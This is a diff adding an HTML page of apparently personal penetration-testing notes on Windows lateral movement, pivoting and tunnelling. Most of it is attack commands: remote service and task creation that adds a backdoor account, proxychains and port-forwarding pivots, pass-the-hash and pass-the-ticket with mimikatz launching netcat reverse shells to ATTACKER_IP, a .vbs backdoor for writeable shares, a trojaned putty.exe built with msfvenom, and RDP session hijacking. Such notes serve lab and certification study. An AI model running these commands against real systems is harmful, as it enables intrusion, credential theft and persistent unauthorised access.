@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Pivoting</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Routing and Tunneling</h1>
+                <p class="alert">Moving between
+                networks</p><strong>Last updated: May 4th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h3>Tooling</h3>
+                    <div>
+                      <ul>
+                        <li>Psexec</li>
+                        <ul>
+                          <li>Ports 445</li>
+                          <li>Administrator group required</li>
+                          <li>Part of sysinternals</li>
+                          <li>Spawn Remote Process</li>
+                          <ul>
+                            <li>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</li>
+                          </ul>
+                        </ul>
+                        <li>WinRM</li>
+                        <ul>
+                          <li>Ports 5985 or 5986 over HTTP</li>
+                          <li>Remote Management Users group required</li>
+                          <li>Usually enabled by default</li>
+                          <li>Spawn Remote Process</li>
+                          <ul>
+                            <li>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</li>
+                          </ul>
+                        </ul>
+                        <li>sc</li>
+                        <ul>
+                          <li>Ports 135/TCP, 49152-65535/TCP (DCE/RPC) or 445/TCP (RPC over SMB Named Pipes) or 139/TCP (RPC over SMB Named Pipes)</li>
+                          <li>Administrator group required</li>
+                          <li>Spawn Remote Service</li>
+                          <ul>
+                            <li>sc.exe \\TARGET create MalService1 binPath= "net user eli2k Pass123 /add" start= auto; sc.exe \\TARGET start MalService1</li>
+                          </ul>
+                        </ul>
+                        <li>schtasks</li>
+                        <ul>
+                          <li>Spawn Remote Task</li>
+                          <ul>
+                            <li>schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;Maltask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00; schtasks /s TARGET /run /TN &quot;MalTask1&quot;</li>
+                          </ul>
+                        </ul>
+                        <li>WMI</li>
+                        <ul>
+                          <li>Ports 135/TCP, 49152-65535/TCP or 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</li>
+                          <li>Administrator Group Required</li>
+                          <li>PSCredential object required</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</code></pre></li>
+                          </ul>
+                          <li>Establish WMI session:</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></pre></li>
+                          </ul>
+                          <li>Remote Process Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value beepbeepboopboop";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}</code></pre></li>
+                          </ul>
+                          <li>Remote Service Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "MalService2";
+DisplayName = "MalService2";
+PathName = "net user eli2k Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}</code></pre></li>
+                            <li><pre><code class="language-powershell">$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'MalService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService</code></pre></li>
+                          </ul>
+                          <li>Remote Task Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell"># Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user eli2k Pass123 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MalTask2"
+Start-ScheduledTask -CimSession $Session -TaskName "MalTask2"</code></pre></li>
+                          </ul>
+                          <li>Installing MSI packages through WMI</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}</code></pre></li>
+                          </ul>
+                        </ul>
+                      </ul>
+                    </div>
+                    <h3>Routing</h3>
+                    <div>
+                      <h4>Autoroute and proxychains</h4>
+                      <div>
+                        <p>I find the easiest way to set up a route is
+                        to use Metasploits autoroute and then run
+                        commands through proxychains. There are
+                        limitations to proxychains you should be aware
+                        of that are listed on its <a href=
+                        "https://github.com/haad/proxychains#known-limitations-of-the-current-version"
+                        target="_blank">Github</a>.</p>
+                        <pre><code class=
+                    "language-powershell">meterpreter&gt; run autoroute -s 255.255.255.0/24
+ctrl-z
+use socks_proxy
+set version 4a
+set SRVHOST OURIP
+run
+ctrl-z
+echo "socks4        OURIP 1080" &gt;&gt; /etc/proxychains.conf
+proxychains nmap -sn 255.255.255.0/24 #this will take a long time even though its only 256 hosts, but you can communicate now</code></pre>
+                        <p>We can also use the ip command on linux to
+                        do this</p>
+                        <pre><code class=
+                        "language-bash">ip route add 255.255.255.0/24 via 10.0.0.100 dev eth0</code></pre>
+                      </div>
+                    </div>
+                    <h3>Port Forwarding</h3>
+                    <div>
+                      <h4>Scenario #1</h4>
+                      <div>
+                        <p>Imagine a scenario where there is a machine
+                        running windows that prevents outbound
+                        connections outside of its private network.
+                        Trying to get a reverse shell is kind of a pain
+                        unless you implement a tunnel from the target,
+                        through a machine that can talk to you. Below
+                        I'll show you can example where this is the
+                        case.</p>
+                        <pre><code class=
+                        "language-powershell">netsh interface portproxy add v4tov4 listenaddress=MACHINEIP listenport=2765 connectaddress=OURIP connectport=2765</code></pre>
+                        <p>This command will listen on 2765 for
+                        incoming connections and forward it to our IP.
+                        This assumes you have someway to make the
+                        device that you're targeting make requests to
+                        the machine running the commands. This socat
+                        command does the same thing but for linux. You
+                        can theoretically tunnel as many machines like
+                        this as you need, as long as the ports match
+                        up.</p>
+                        <pre><code class=
+                        "language-powershell"> socat TCP-LISTEN:2765,bind=MACHINEIP,fork,reuseaddr TCP:OURIP:2765&</code></pre>
+                      </div>
+                      <h4>Scenario #2</h4>
+                      <div>
+                        <p>What if you find a service that listens only
+                        to local connections such as:</p><img src=
+                        "https://eli2k.com/resources/images/127listeningservice.png">
+                        <p>This would be good time to implement port
+                        forwarding. I like using ssh for this, but I've
+                        seen people use metasploit as well</p>
+                        <pre><code class=
+                      "language-bash">#ssh local port forward
+##attacker
+ssh -fNL 80:127.0.0.1:8989 user@pivot.com
+##attacker
+curl https://127.0.0.1:80
+#You should get a response if it's a webserver
+
+#metasploit
+meterpreter&gt;portfwd add -l 80 -p 8989 -r target.com</code></pre>
+                      </div>
+                    </div>
+                    <h3>Alternate Channels</h3>
+                    <div>
+                      <h4>NTLM</h4>
+                      <div>
+                        <ul>
+                          <li>Pass-the-Hash</li>
+                          <ol>
+                            <li>Dump Hash</li>
+                            <li><pre><code class="language-bash">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</code></pre></li>
+                          </ol>
+                        </ul>
+                      </div>
+                      <h4>Kerberos</h4>
+                      <div>
+                        <ul>
+                          <li>Pass-the-Ticket</li>
+                          <ol>
+                            <li><pre><code class="language-powershell"></code>mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.EXAMPLE.COM.kirbi
+</pre></li>
+                          </ol>
+                          <li>Pass-the-Key</li>
+                          <ul>
+                            <li><pre><code class="language-powershell"></code></pre></li>
+                            <li>RC4: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>AES128: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>AES256: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>Set up a reverse shell</li>
+                          </ul>
+                        </ul>
+                      </div>
+                      <h4>User Behaviour</h4>
+                      <div>
+                        <ul>
+                          <li>Backdooring Writeable Shares</li>
+                          <ol>
+                            <li>.vbs Scripts<pre><code class="language-powershell">CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True</code></pre></li>
+                            <li>.exe Files<pre><code class="language-powershell">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</code></pre></li>
+                          </ol>
+                          <li>RDP Hijacking</li>
+                          <ol>
+                            <li><pre><code class="language-powershell">query user</code></pre></li>
+                            <li><pre><code class="language-powershell">tscon 3 /dest:rdp-tcp#6</code></pre></li>
+                          </ol>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+    </div>
+    <script src=
+    "https://eli2k.com/resources/js/themeSwitch.js"></script>
+    <script src=
+    "https://eli2k.com/resources/js/collapseList.js"></script>
+    
+  </div>
+</body>
+</html>
